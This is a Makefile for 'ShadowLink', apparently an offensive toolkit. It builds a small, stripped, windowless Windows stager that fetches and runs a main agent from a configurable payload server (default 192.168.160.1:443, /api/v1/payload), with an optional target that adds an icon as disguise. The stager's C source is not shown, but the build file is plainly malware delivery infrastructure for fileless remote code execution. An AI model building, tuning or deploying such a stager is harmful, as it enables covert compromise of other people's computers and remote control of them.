# ShadowLink Stager/Loader
# Phase 11: Fileless Execution
#
# This Makefile builds a minimal stager that downloads and executes the main agent

CC = gcc
CFLAGS = -Os -s -DBUILD_STAGER_EXE
LDFLAGS = -lwinhttp -mwindows
WINDRES = windres

# Output
TARGET = stager.exe
OBJS = stager.o

# Server configuration (override at compile time)
# Example: make PAYLOAD_HOST=192.168.1.100 PAYLOAD_PORT=8443
PAYLOAD_HOST ?= 192.168.160.1
PAYLOAD_PORT ?= 443
PAYLOAD_PATH ?= /api/v1/payload

# Add configuration defines
CFLAGS += -DPAYLOAD_HOST=L\"$(PAYLOAD_HOST)\"
CFLAGS += -DPAYLOAD_PORT=$(PAYLOAD_PORT)
CFLAGS += -DPAYLOAD_PATH=L\"$(PAYLOAD_PATH)\"

.PHONY: all clean minimal debug

# Default build (minimal size)
all: minimal

# Minimal size build
minimal: CFLAGS += -O3 -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections
minimal: LDFLAGS += -Wl,--gc-sections -Wl,-s
minimal: $(TARGET)
	@echo "[+] Minimal stager built: $(TARGET)"
	@ls -la $(TARGET)

# Debug build (with console)
debug: CFLAGS = -g -DBUILD_STAGER_EXE -DDEBUG
debug: LDFLAGS = -lwinhttp -mconsole
debug: $(TARGET)
	@echo "[+] Debug stager built: $(TARGET)"

$(TARGET): $(OBJS)
	$(CC) -o $@ $^ $(LDFLAGS)
	@echo "[*] Size: $$(wc -c < $(TARGET)) bytes"

%.o: %.c
	$(CC) $(CFLAGS) -c -o $@ $<

# Optional: Add icon/resource
resource:
	@echo "1 ICON \"stager.ico\"" > stager.rc
	$(WINDRES) stager.rc -o stager_res.o
	$(CC) $(CFLAGS) -o $(TARGET) stager.c stager_res.o $(LDFLAGS)

clean:
	rm -f $(TARGET) $(OBJS) stager_res.o stager.rc

# Show build info
info:
	@echo "Server: $(PAYLOAD_HOST):$(PAYLOAD_PORT)$(PAYLOAD_PATH)"
	@echo "Build: $(CFLAGS)"
